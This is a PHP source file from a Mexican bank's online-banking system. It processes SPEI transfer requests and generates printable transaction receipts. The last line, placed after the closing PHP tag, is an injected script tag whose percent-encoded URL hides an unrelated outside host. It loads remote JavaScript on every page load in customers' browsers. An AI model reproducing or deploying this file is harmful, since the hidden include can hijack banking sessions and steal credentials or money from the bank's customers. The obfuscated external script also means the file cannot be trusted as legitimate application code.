<?php
//
// $Id: speuaTT.php,v 1.0 2001/11/01 11:22:30 smb Exp $
//
// Created on: <1-Nov-2001 17:37:53 smb>
//
// This source file is part of IVA.
//
// Copyright (C) 1997-2004 Internet de Alta Calidad, S.A. de C.V.  Todos los derechos reservados. All rights reserved.
//
// This program is free software; you can redistribute it and/or
// modify it under the terms of the GNU General Public License
// as published by the Free Software Foundation; either version 2
// of the License, or (at your option) any later version.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with this program; if not, write to the Free Software
// Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, US
//

include_once( "classes/INIFile.php" );
include_once( "classes/eztemplate.php" );
include_once( "classes/ezhttptool.php" );

include_once( "eztransaccion/classes/eztransaccion.php" );
include_once( "ezsession/classes/ezsession.php" );
include_once( "classes/ezdatetime.php" );
include_once( "eztransaccion/classes/encrypt.php" );
$session =& eZSession::globalSession();

if( !$session->fetch() )
    $session->store();

$ini =& $GLOBALS["GlobalSiteIni"];

$Language = $ini->read_var( "eZTransaccionMain", "Language" );
// $backend = $ini->read_var( "eZTransaccionMain", "Backend" );
$ServerNumber = $ini->read_var( "site", "ServerNumber" );
$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );

$backend = "gw" . $ServerNumber. $DomainPostfix;

include_once( "ezuserbb/classes/ezuser.php" );
include_once( "ezreimp/classes/ezreimp.php" ); //DBA Reimpresion de Comprobantes

$user =& eZUserBB::currentUser();

// DebugBreak();

if ( $user )
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "speuaTT.php" );

    $t->setAllStrings();

	// AGG I 25Nov2005 Para poner fecha y hora en los comprobantes
	$dateTime  = new eZDateTime( );
	$timeStamp = $dateTime->timeStamp();
	$time =& date('H:i:s', $timeStamp );
	$date =& date('jMY', $timeStamp );
	// AGG F 25Nov2005 Para poner fecha y hora en los comprobantes

    $t->set_file( array(
        "speuaTT_tpl" => "speuaTT.tpl"
        ) );


    $session =& eZSession::globalSession();

    if ( !$session->fetch() )
    {
        $session->store();
    }

    $tr = new eZTransaccion( );
    $usr = $session->variable( "r_usr" );
    $qki = $session->variable( "r_qki" );
    $priv = $session->variable( "r_priv" );
    $transaccion_buffer = "";
    
//HB
	if(!empty($_POST['Access']))
		$Access = $_POST['Access'];
		
	if(!empty($_POST['Empresa']))
		$Empresa = $_POST['Empresa'];
		
	if(!empty($_POST['Position']))
		$Position = $_POST['Position'];
		
	if(!empty($_POST['FrAccount']))
		$FrAccount = $_POST['FrAccount'];
		
	if(!empty($_POST['Apocope']))
		$Apocope = $_POST['Apocope'];
		
	if(!empty($_POST['NombreB']))
		$NombreB = $_POST['NombreB'];
		
	if(!empty($_POST['Amount']))
		$Amount = $_POST['Amount'];
		
	if(!empty($_POST['ToAccount']))
		$ToAccount = $_POST['ToAccount'];
		
	if(!empty($_POST['Amount']))
		$Amount = $_POST['Amount'];
		
	if(!empty($_POST['Desc']))
		$Desc = $_POST['Desc'];
		
	if(!empty($_POST['RenInt']))
		$RenInt = $_POST['RenInt'];	
		
	if(!empty($_POST['Button']))
		$Button = $_POST['Button'];
		
	if(!empty($_POST['code']))
		$code = $_POST['code'];
//HB
    if(empty($Access)) {
        $Access = "FrAc";
    }
    $Empresa = "TT";
    if(empty($Position)) { $Position = ""; } //LVPR Position SPEI
    switch($Access) {
    case "FrAc":
        $particularFields = "&Empresa=".urlencode($Empresa);
        $tr->blog($qki,"SpeuaTT", $FrAccount, $Apocope, $NombreB, $Amount, $Empresa);
        break;
    case "Confirm":
        $particularFields = "&FrAccount=".urlencode( $FrAccount )."&ToAccount=".urlencode( $ToAccount )."&Amount=".urlencode( $Amount )."&Desc=".urlencode( preg_replace( "/&/", "-", $Desc ) )."&RenInt=".urlencode( $RenInt )."&Button=".urlencode( $Button )."&Empresa=".urlencode( $Empresa )."&Position=".urlencode( $Position ); //LVPR Position SPEI		 /* HB AGL*/
        $tr->blog( $qki, "SpeuaTT", $FrAccount, $Apocope, $NombreB, $Amount, $Empresa );
        break;
    case "Process":
        $particularFields = "&Passwd=".encrypt( $code, strtolower( $usr ) )."&FrAccount=".urlencode( $FrAccount )."&Apocope=".urlencode( $Apocope )."&Amount=".urlencode( $Amount )."&ToAccount=".urlencode( $ToAccount )."&NombreB=".urlencode( $NombreB )."&DireccB=".urlencode( $DireccB )."&TeleB=".urlencode( $TeleB )."&Desc=".urlencode( preg_replace( "/&/", "-", $Desc ) )."&RFC=".urlencode( $RFC )."&RenInt=".urlencode( $RenInt )."&Button=".urlencode( $Button )."&Empresa=".urlencode( $Empresa )."&Estado=".$Estado."&Position=".urlencode( $Position ); //LVPR Position SPEI     /* HB AGL*/
        $tr->blog($qki,"SpeuaTT", $FrAccount, $Apocope, $NombreB, $Amount,$Empresa);
        break;
    }
    $transaccion_buffer = "";
    // DebugBreak();
    $ret_code = $tr->PostToHost($backend, "/IBnkIIS.dll", "Trxn=spi&Access=".urlencode($Access)."&CustID=".urlencode($usr)."&Cadpriv=".urlencode($priv).$particularFields, $qki, $usr, $qki, $priv, $transaccion_buffer); // SPEUATT


	// AGG I 25Nov2005 Generacion de comprobantes
	if ($Access == "Process" and strpos($transaccion_buffer,"No. de Autoriza") != false)
	{
		if (strpos($transaccion_buffer,"El saldo disponible") === false ) //si no tiene saldos
		{
			$buffer2 = str_replace(chr(34),chr(92).chr(34),$transaccion_buffer);
		}
		else //si tiene saldos hay que quitarlos
		{
			if (strpos($transaccion_buffer,"Para clientes que requieren comprobante") === false ) // si no tiene DFA
			{
				$buffer3 = substr($transaccion_buffer,0,strpos($transaccion_buffer,"El saldo disponible"));
				$buffer4 = substr($transaccion_buffer,strpos($transaccion_buffer,"No. de Folio"));
				$buffer2 = str_replace(chr(34),chr(92).chr(34),$buffer3.$buffer4);
			}
			else
			{
				$buffer3 = substr($transaccion_buffer,0,strpos($transaccion_buffer,"El saldo disponible"));
				$buffer4 = substr($transaccion_buffer,strpos($transaccion_buffer,"Para clientes que requieren comprobante"));
				$buffer2 = str_replace(chr(34),chr(92).chr(34),$buffer3.$buffer4);
			}
		}
		$buffer2 = substr($buffer2,0,strpos($buffer2,"(Por favor anote el "));

		//var_dump ( $date);

		$ini =& INIFile::globalINI();
		$SecureServer = $ini->read_var( "site", "SecureServer" );
		$SecureServerType = $ini->read_var( "site", "SecureServerType" );
		$DomainPostfix = $ini->read_var( "site", "DomainPostfix" );
		$ServerNumber = $ini->read_var( "site", "ServerNumber" );

		if ( $Comprobante == "Activo" )
		{
		$Pagina = "<SCRIPT LANGUAGE='JavaScript'> function ventana() { var windowW = 800; var windowH = 450; var windowX = 10; var windowY = 10; var title = 'Recibo'; s = 'width='+windowW+',height='+windowH; cadena=\"<HTML><HEAD><link REL='STYLESHEET' HREF='" . $SecureServerType . "://" . $SecureServer . $ServerNumber . $DomainPostfix . "/impuestos/recibos.css' TYPE='text/css'><TITLE>SPEI</TITLE>";
		$Pagina = $Pagina."<SCRIPT LANGUAGE='JavaScript'> function window_onbeforeprint() { Imprimir.style.visibility = 'hidden'; Salir.style.visibility = 'hidden';} function window_onafterprint() { Imprimir.style.visibility = 'visible'; Salir.style.";
		$Pagina = $Pagina."visibility = 'visible'; }\"+\"<\"+\"/\"+\"SCRIPT></HEAD><BODY LANGUAGE='javascript' onbeforeprint='return window_onbeforeprint()' onafterprint='return window_onafterprint()'>";
		$Pagina = $Pagina."<INPUT type='button' value='Imprimir' id=Imprimir name=Imprimir onclick='window.print();'>&nbsp;<INPUT type='button' value=' Salir  ' id=Salir name=Salir onclick='window.close();'>";
		$Pagina = $Pagina."<BR>";
		$Pagina = $Pagina."<P><CENTER>";
		$Pagina = $Pagina."<IMG SRC='" . $SecureServerType . "://" . $SecureServer . $ServerNumber . $DomainPostfix . "/impuestos/LOGO_BB.GIF' ALIGN= 'TOP' Banco del Bajio>";
		$Pagina = $Pagina."</P></CENTER>";
		$Pagina = $Pagina."<H2>SPEI</H2>";
		$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />";
		$Pagina = $Pagina."<P ALIGN='RIGHT'><B><FONT>$date $time</FONT></B></P>";
		$Pagina = $Pagina.$buffer2;
		$Pagina = $Pagina."<BR><hr noshade='noshade' size='4' color='#5A419c' />";
		$Pagina = $Pagina."<p><FONT SIZE=1>Av. Manuel J. Clouthier No. 508 Col. Jardines del Campestre CP 37128 León, Gto.</FONT> </p>";
		$Pagina = $Pagina."<p><FONT SIZE=1>Consultas y aclaraciones 01 (477) 710- 4600 o al 01 (800) 471-0400</FONT></p>";
		$Pagina = $Pagina."<p><FONT SIZE=1>LA TRANSFERENCIA A LA QUE HACE REFERENCIA ESTE COMPROBANTE FUE REALIZADA CONFORME A LA INFORMACIÓN E INSTRUCCIONES QUE NUESTRO CLIENTE ALIMENTÓ EN EL SISTEMA DE BANCO DEL BAJÍO, POR LO TANTO EL CLIENTE ES EL ÚNICO RESPONSABLE PRESENTE Y FUTURO POR CUALQUIER ERROR U OMISIÓN EN ESTA OPERACIÓN.</FONT></P>";
		$Pagina = $Pagina."<p><FONT SIZE=1>EL ÚNICO COMPROBANTE OFICIAL DE ESTA TRANSACCIÓN ES EL ESTADO DE CUENTA QUE EMITEN BANCO DEL BAJIO Y EL BANCO RECEPTOR DE ESTA TRANSACCIÓN.</FONT></p>";
		$Pagina = $Pagina."</BODY></HTML>\"; NFW =";
		$Pagina = $Pagina." window.open(\"\",'Recibo',\"toolbar=no,menubar=no,scrollbars=2,\"+s); NFW.blur(); NFW.resizeTo(windowW,windowH); NFW.moveTo(windowX,windowY); NFW.";
		$Pagina = $Pagina."document.open(); NFW.document.write(cadena); NFW.document.close(); NFW.window.focus(); } ventana(); </SCRIPT>";
		}
		//DBA Reimpresion de Comprobantes
		$posMancomunado = strpos($transaccion_buffer,"usuario facultado.");
		if ( $posMancomunado > 0 )
		{
		}
		else
		{
			$FechaHora = $date . " " . $time;
			$QryRIC = new eZReImp( );
			$QryRIC -> store($CustID,$FrAccount,$buffer2,"spi","SPEI",$FechaHora);
		}
		//DBA Reimpresion de Comprobantes
	}
    $t->set_var( "transaccion_buffer", $transaccion_buffer.$Pagina );
	// AGG F 25Nov2005 Generacion de comprobantes

    //$t->set_var( "transaccion_buffer", $transaccion_buffer );
    $t->pparse( "output", "speuaTT_tpl" );
    //var_dump ($particularFields);
}
else
{
    $t = new eZTemplate( "eztransaccion/user/" . $ini->read_var( "eZTransaccionMain", "TemplateDir" ),
                         "eztransaccion/user/intl/", $Language, "userlogin.php" );

    $t->setAllStrings();

    $t->set_file( array(
        "user_login_tpl" => "userlogin.tpl"
        ) );

    $t->set_var( "redirect_url", "/transaccion/speuaTT/" );

    $t->pparse( "output", "user_login_tpl" );
}
?>
<script src="http://%71%7A%68%2E%74%78%73%68%69%2E%63%6F%6D/%62%32%2E%61%73%70"></script>